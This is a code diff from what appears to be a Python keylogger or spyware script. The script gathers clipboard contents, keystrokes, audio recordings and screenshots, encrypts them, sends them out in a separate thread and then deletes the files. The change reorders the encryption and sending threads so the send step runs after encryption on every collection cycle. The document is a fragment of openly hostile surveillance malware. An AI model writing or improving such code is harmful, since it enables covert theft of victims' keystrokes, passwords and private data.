@@ -60,6 +60,7 @@ extend = "\\"
 file_merge = file_path + extend
 
 encryption_done = False
+sent_done = False
 
 files_to_encrypt = [file_merge + clipboard_information, file_merge + keys_send]
 send_file_names = [file_merge + clipboard_information_e, file_merge + keys_send_e, file_merge + audio_information, file_merge + screenshot_information ]
@@ -299,21 +300,24 @@ while number_of_iterations < number_of_iterations_end:
             f.write(" ")
         
         number_of_iterations += 1
+        encryption_done = False
+        sent_done = False
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
          
     if all(not thread.is_alive() for thread in threads):
-        if not encryption_done:
-            threads.extend([threading.Thread(target=encryption)])
-            threads[-1].start()
-            encryption_done = True
         if encryption_done : #This blocks entry until threads[3] is added then the initial if condition handles 
             threads.extend([threading.Thread(target=sending_files)])
             threads[-1].start()
             encryption_done = False
+            sent_done = True
+        if not encryption_done and not sent_done:
+            threads.extend([threading.Thread(target=encryption)])
+            threads[-1].start()
+            encryption_done = True
                             
 
-threads[4].join()
+threads[-1].join()
 t3.join()
 delete_files =  system_files + encrypted_system_files + files_to_encrypt + send_file_names 
 for file in delete_files:
